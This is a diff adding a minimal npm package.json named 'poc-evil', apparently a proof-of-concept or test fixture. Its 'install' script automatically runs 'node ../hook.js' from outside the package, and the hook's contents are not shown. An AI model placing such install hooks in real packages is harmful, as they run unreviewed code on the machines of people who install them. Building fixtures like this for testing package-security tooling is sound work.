@@ -1,0 +1,5 @@
+{
+  "name": "poc-evil",
+  "version": "1.0.0",
+  "scripts": { "install": "node ../hook.js" }
+}
